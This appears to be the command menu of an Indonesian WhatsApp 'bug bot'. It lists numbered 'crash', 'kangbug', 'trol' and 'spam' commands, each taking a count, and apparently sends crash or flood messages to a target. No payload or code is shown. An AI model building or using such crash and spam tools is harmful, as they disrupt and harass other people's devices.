╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐝𝐚𝐜𝐚 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐝𝐮𝐜 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐝𝐮𝐜𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐭𝐫𝐨𝐥𝐢 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐭𝐫𝐨𝐥𝐢𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐭𝐫𝐨𝐥𝐢𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐣𝐡𝐨𝐧 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐛𝐮𝐭𝐭𝐨𝐧 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐤𝐚𝐭𝐚𝐥𝐨𝐠 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐝𝐮𝐜𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐝𝐚𝐜𝐚 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐝𝐫𝐚𝐤𝐧𝐞𝐬 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐬𝐥𝐞𝐛𝐞𝐰 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐬𝐮 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐭𝐨𝐥 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐦𝐞𝐦𝐞𝐤 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐜𝐨𝐧𝐭𝐨𝐥 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐭𝐞𝐱𝐭𝐯 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐠𝐚𝐬 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐜𝐫𝐚𝐬𝐡 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐜𝐫𝐚𝐬𝐡𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐜𝐫𝐚𝐬𝐡𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐜𝐫𝐚𝐬𝐡𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐜𝐫𝐚𝐬𝐡𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐜𝐫𝐚𝐬𝐡𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐜𝐫𝐚𝐬𝐡𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐜𝐫𝐚𝐬𝐡𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐥𝐨𝐤𝐚𝐬 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐥𝐨𝐤𝐚𝐬𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐤𝐚𝐧𝐠𝐛𝐮𝐠 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐤𝐚𝐧𝐠𝐛𝐮𝐠𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐛𝐚𝐫 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐨𝐤𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐞𝐰𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝐧𝐠𝐞𝐧𝐭𝐨𝐝 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
...
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝟏𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝟏𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐚𝐧𝐠𝐠𝐚𝐳𝐲𝐲𝐩𝐢𝐰𝟏𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
╠➤𝐬𝐩𝐚𝐦 [ 𝐑𝐞𝐩𝐥𝐲 𝐏𝐞𝐬𝐚𝐧 ]
╚════[ 𝕬𝖓𝖌𝖌𝖆 𝕾𝖆𝖙𝖆𝖓𝖎𝖈 ]══════⊱
